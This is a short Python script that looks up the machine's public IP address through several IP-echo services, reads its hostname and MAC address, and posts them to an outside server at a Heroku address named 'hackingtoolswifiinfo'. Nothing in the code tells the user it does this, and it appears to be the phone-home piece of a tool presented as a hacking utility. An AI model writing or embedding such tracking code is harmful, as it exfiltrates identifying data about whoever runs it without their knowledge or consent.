import sys
import urllib.request
import socket
import uuid
import requests

api_url = "https://hackingtoolswifiinfo.herokuapp.com/sensor"

IP_WEBSITES = (
    'https://ipinfo.io/ip',
    'https://ipecho.net/plain',
    'https://api.ipify.org',
    'https://ipaddr.site',
    'https://icanhazip.com',
    'https://ident.me',
    'https://curlmyip.net',
)

for ipWebsite in IP_WEBSITES:
    response = urllib.request.urlopen(ipWebsite)

    charsets = response.info().get_charsets()
    if len(charsets) == 0 or charsets[0] is None:
        charset = 'utf-8'  # Use utf-8 by default
    else:
        charset = charsets[0]

    userIp = response.read().decode(charset).strip()


hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

mac_num = hex(uuid.getnode()).replace('0x', '').upper()
mac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))

values = {"id": "1", "ip": userIp, "mac": mac, "hostname": hostname}

response = requests.post(api_url, json=values)
response.json()